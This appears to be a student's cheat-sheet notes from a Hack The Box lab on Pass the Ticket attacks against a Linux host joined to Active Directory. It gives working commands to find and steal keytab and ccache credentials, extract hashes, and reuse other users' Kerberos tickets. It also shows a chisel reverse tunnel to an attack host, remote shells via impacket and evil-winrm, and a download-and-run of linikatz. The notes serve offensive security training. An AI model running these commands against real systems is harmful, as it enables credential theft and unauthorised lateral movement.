# Pass the Ticket

***

_realm_ to check if Linux machine is Domain Joined

```bash
realm list
```

_ps_

```bash
ps -ef | grep -i "winbind\|sssd"
```

## Find Kerberos Tickets

### Keytab files

```bash
find / -name *keytab* -ls 2>/dev/null
```

```bash
crontab -l
```

_kinit_ allows interaction with Kerberos

### ccache Files

```bash
env | grep -i krb5
```

ccache files are located, by default, at /tmp.

```bash
ls -la /tmp
```

### Abusing KeyTab Files

```bash
klist -k -t 
```

```bash
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

```bash
smbclient //dc01/carlos -k -c ls
```

#### Keytab Extract

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

[crackstation](https://crackstation.net/)

### Abusing Keytab ccache

```bash
ls -la /tmp
```

Identifying Group Membership with the id Command

```bash
id julio@inlanefreight.htb
```

#### Importing the ccache File into our Current Session

```bash
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
```

## Linux attack tools with Kerberos

### Host file

```shell-session
# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

### Proxychains

```shell-session
[ProxyList]
socks5 127.0.0.1 1080
```

[chisel](https://github.com/jpillora/chisel)

### Download Chisel to our Attack Host

```shell-session
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse 
```

```shell-session
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

#### Chisel from MS01

```cmd-session
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

#### Impacket

```bash
proxychains impacket-wmiexec dc01 -k
```

#### Evil-Winrm

```bash
sudo apt-get install krb5-user -y
cat /etc/krb5.conf
```

```shell-session
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

## Miscellaneos

If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.

```shell-session
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

**Importing Converted Ticket into Windows Session with Rubeus**

```cmd-session
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

## Linikatz

[Linikatz](https://github.com/CiscoCXSecurity/linikatz)  is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to `Mimikatz` to UNIX environments.

```shell-session
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh
```
